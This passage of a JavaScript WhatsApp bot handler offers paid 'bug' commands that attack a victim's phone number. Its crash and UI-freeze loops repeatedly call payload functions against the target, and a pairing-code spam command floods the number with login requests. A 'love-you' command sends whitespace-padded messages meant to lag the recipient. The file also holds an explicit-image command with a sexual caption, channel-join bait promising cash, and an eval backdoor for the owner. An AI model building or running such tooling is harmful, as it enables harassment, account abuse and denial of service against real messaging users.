https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06

3. send a message "hi" to my 
https://t.me/axiombanner
`)
}
break

case 'bugmenu': {
const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ sigma͢girl
> *➼ versão :* ↯ 1.0.0
> *➼ dev :* ↯ muzan sigma 
> *➼ geração :* ↯ legal

*🎀 b͢ug ↯ dev͢ice 🎀*
> ➩ .xandro ↯ *núm͢ero*
> ➩ .xiphone ↯ *núm͢ero*
> ➩ .xios ↯ *núm͢ero*

*🎀 b͢ug ↯ sys͢tem 🎀*
> ➩ .hard-fc ↯ *núm͢ero*
> ➩ .ui-system ↯ *núm͢ero*
> ➩ .ui-1day ↯ *núm͢ero*
> ➩ .blank ↯ *núm͢ero*

*🎀 an͢ti ↯ ba͢ns 🎀*
> ➩ .attack-fc ↯ *núm͢ero|amount*
> ➩ .attack-ui ↯ *núm͢ero|amount*

*🎀 ad͢d ↯ acc͢ess 🎀*
> ➩ .add-acces ↯ *núm͢ero|30d*
> ➩ .del-acces ↯ *núm͢ero*

*desen͢volvedor de canal*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06
`;

  // Pastikan variabel 'fs' telah diimpor sebelumnya dengan 'const fs = require("fs")'
  let pesanFotoTeks = {
    image: fs.readFileSync('./cicitzy/cici-clyriné.jpg'), // Periksa path gambar benar
  };

  let buttons = [
    { buttonId: '.vipbug', buttonText: { displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀' }, type: 1 }
  ];

  // Hapus properti 'image: { url: image }' atau definisikan variabel 'image' terlebih dahulu
  // Jika ingin menggunakan gambar dari file lokal, gunakan pesanFotoTeks.image
  let buttonMessage = {
    image: pesanFotoTeks.image, // Gunakan gambar lokal yang sudah dibaca
    // gifPlayback: true, // Hapus atau aktifkan jika memang menggunakan GIF
    caption: teks,
    buttons: buttons,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363424304885587@newsletter",
        newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
      }
    },
    footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
    viewOnce: true,
    headerType: 6
  };

  // Hapus parameter 'pesanFotoTeks' karena sudah tercakup dalam 'buttonMessage'
  await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m });

  // Pastikan path file audio benar dan 'fs' telah diimpor
  await ciciimup.sendMessage(m.chat, { 
    audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), 
    mimetype: 'audio/mpeg', 
    ptt: false 
  }, { quoted: m });
}
break;

case 'banmenu': {
const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ sigma͢girl
> *➼ versão :* ↯ 1.0.0
> *➼ dev :* ↯ muzan sigma 
> *➼ geração :* ↯ legal

*🎀 ba͢ns ↯ me͢nu 🎀*
> ➩ .report1 ↯ *núm͢ero*
> ➩ .report2 ↯ *núm͢ero*
> ➩ .spairing ↯ *núm͢ero*

*🎀 ad͢d ↯ acc͢ess 🎀*
> ➩ .add-acces ↯ *núm͢ero|30d*
> ➩ .del-acces ↯ *núm͢ero*

*desen͢volvedor de canal*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06
`;

  // Pastikan variabel 'fs' telah diimpor sebelumnya dengan 'const fs = require("fs")'
  let pesanFotoTeks = {
    image: fs.readFileSync('./cicitzy/cici-clyriné.jpg'), // Periksa path gambar benar
  };

  let buttons = [
    { buttonId: '.vipbug', buttonText: { displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀' }, type: 1 }
  ];

  // Hapus properti 'image: { url: image }' atau definisikan variabel 'image' terlebih dahulu
  // Jika ingin menggunakan gambar dari file lokal, gunakan pesanFotoTeks.image
  let buttonMessage = {
    image: pesanFotoTeks.image, // Gunakan gambar lokal yang sudah dibaca
    // gifPlayback: true, // Hapus atau aktifkan jika memang menggunakan GIF
    caption: teks,
    buttons: buttons,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363424304885587@newsletter",
        newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
      }
    },
    footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
    viewOnce: true,
    headerType: 6
  };

  // Hapus parameter 'pesanFotoTeks' karena sudah tercakup dalam 'buttonMessage'
  await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m });

  // Pastikan path file audio benar dan 'fs' telah diimpor
  await ciciimup.sendMessage(m.chat, { 
    audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), 
    mimetype: 'audio/mpeg', 
    ptt: false 
  }, { quoted: m });
}
break;

case 'ui-1day':
case 'ui-system':
case 'hard-fc': {
if (!isPremium) return ciciimupreply('</> premium access only </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_Please take a 5-minute break when using this bug to prevent your number from being banned_
`) 
for (let i = 0; i < 50; i++) {
await cicitzy1(target)
await cicitzy2(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'xios':
case 'xiphone':
case 'xandro':
case 'blank': {
if (!isPremium) return ciciimupreply('</> premium access only </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_Please take a 5-minute break when using this bug to prevent your number from being banned_
`) 
for (let i = 0; i < 50; i++) {
await cicitzy1(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'attack-ui': case 'attack-fc': {
  if (!isPremium) return ciciimupreply('</> premium access only </>')
  await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
  if (!q) return ciciimupreply(`Example: ${prefix + command} 62xxx|10 (the number at the end is the number of shipments)`)
  
  // Pisahkan nomor dan jumlah pengiriman menggunakan |
  const [nomorRaw, jumlahRaw] = q.split('|')
  if (!nomorRaw || !jumlahRaw) return ciciimupreply('Incorrect format! Use:  .report1 62xxx|10')
  
  // Validasi nomor dan jumlah
  const target = nomorRaw.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
  const jumlah = parseInt(jumlahRaw)
  if (isNaN(jumlah) || jumlah < 1 || jumlah > 99999999) { // Batas jumlah agar tidak berlebihan
    return ciciimupreply('The number must be a number between 1-1000!')
  }

  ciciimupreply(bugres)
  ciciimupreply(`*</> ⚠ warning ⚠️</>*

_Please take a 5-minute break when using this report to prevent your number from being banned_
`) 
  
  // Loop sesuai jumlah yang diminta
  for (let i = 0; i < jumlah; i++) {
    await cicitzy3(target)
    await cicitzy1(target)
    await cicitzy2(target)
    // Tambah jeda kecil antar pengiriman agar tidak error (opsional tapi disarankan)
    await new Promise(resolve => setTimeout(resolve, 500))
  }

  ciciimupreply(`Suscesfully report to ${target}🐉 (total ${jumlah} times delivery)`)
  ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'test': {
if (!isPremium) return ciciimupreply('</> premium access only </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_Please take a 5-minute break when using this bug to prevent your number from being banned_
`) 
for (let i = 0; i < 50; i++) {
await cicitzy3(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

 /* CASE RENDEM LAIN NYA BY CICITZY IMUT KIYUT CANTIK OKY? */

case 'hentai': {
  const hentai = [
    "https://files.catbox.moe/f4kqyq.jpg",
    "https://i.waifu.pics/lnmt7cD.jpg",
    "https://i.waifu.pics/IonCaic.jpg",
    "https://files.catbox.moe/1atdik.jpg",
    "https://files.catbox.moe/prhzxf.jpg",
    "https://files.catbox.moe/sd4zt2.jpg",
    "https://files.catbox.moe/f5ls01.jpg",
    "https://files.catbox.moe/7mb0sp.jpg",
    "https://files.catbox.moe/zveq5a.jpg",
    "https://files.catbox.moe/jpgvms.jpg"
  ];

  try {
    // Menghasilkan index acak langsung
    const randomIndex = Math.floor(Math.random() * hentai.length);
    const fotoAcak = hentai[randomIndex];

    await ciciimup.sendMessage(m.chat, { image: { url: fotoAcak }, caption: 'ah please lick my pussy 🥺' }, { quoted: m });
  } catch (err) {
    console.error("error sending hentai photos:", err);
    reply("an error occurred while sending the hentai image");
 }
 
 ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/馃嵎隀巴⊥滒潗忦潗氿潗ゐ潗擆潗仇潗拆煉柑封儧鈨.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'cekidch': case 'idch': {
if (!text) return m.reply("where is the channel link, darling?")
if (!text.includes("https://whatsapp.com/channel/")) return 
m.reply("Invalid channel link!")
m.reply(`*check Id Ch Feature Process!...*`)
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await ciciimup.newsletterMetadata("invite", result)
let teks = `${res.id}`
return m.reply(teks)
}
break

case 'ell':
case 'acot':
case 'mpas':
case 'acor':
case 'ya':
case 'a':
case 'anel':
case 'atim':
case 'emek': {
ciciimupreply(`
*pls join my channel, i can give you $7 USD*

*telegram channel :*
https://t.me/axiome_7

*whatsapp channel :*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06

join darling
`)
}
break

case 'ug':
case 'ontol':
case 'ama': 
case 'c':
case 'pen':
case 'lol':
case 'ol': {
ciciimupreply(`
*pls join my channel, i can give you $7 USD*

*telegram channel :*
https://t.me/axiome_7

*whatsapp channel :*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06

join darling
`)
}
break

case 'spairing':
case 'spam-pairing': {
  if (!isPremium) return m.reply('premium access only!!');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, cicitzyspam = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < cicitzyspam; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break

case 'love-you': {
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
cicitzyFix = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimup.sendMessage(cicitzyFix, {text: `darling, i love you 😭💔💋 🫩
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
i love you`})
m.reply(`succes send ${command} ✅
${target}`)

ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'sreactch': case 'rch': {
if (!isPremium) return m.reply('premium access only!!');

if (!text) return m.reply(".rch channel")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("invalid channel link!")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await ciciimup.newsletterMetadata("invite", result)

await ciciimup.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`success sent reaction ${args[1]} to channel ${res.name}`)

}
break

case 'addprem': case 'add-acces': {
if (!Access) return ciciimupreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return ciciimupreply(`what's the number, and how many days do you want it for? example : ${prefix + command} @tag|30d`)
    if (!hari) return ciciimupreply(`how many days do you want jirr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return ciciimupreply('lol, free owner')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return ciciimupreply('Suscesfully add premium🐉')
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium🐉')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/jqen9o.png`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06'
                }	
            }	
        };	
        return ciciimup.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         ciciimupreply("not found")
    }	
}
break

case 'owner': case 'own': {
ciciimupreply(`https://${global.owner}
this is my owner, darling!! 🌸

> cici clyriné`)
}
break

case 'delprem': case 'del-acces': {
if (!Access) return ciciimupreply(mess.owner)
    if (!args[0]) return ciciimupreply(` who wants to be ${command}? use number/tag, example : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return ciciimupreply("you not premium user")
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        ciciimupreply(' that user has been deleted')
    } else {	
        ciciimupreply("not found")
    }
}
break

case 'public': {
if (!isPremium) return ciciimupreply(" sorry you do not have access ")
ciciimup.public = true
ciciimupreply(`*public mode has been activated*

> muzan sigma love you`)
}
break

case 'self': {
if (!isPremium) return ciciimupreply(" sorry you do not have access ")
ciciimup.public = false
ciciimupreply(`*self mode has been activated*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
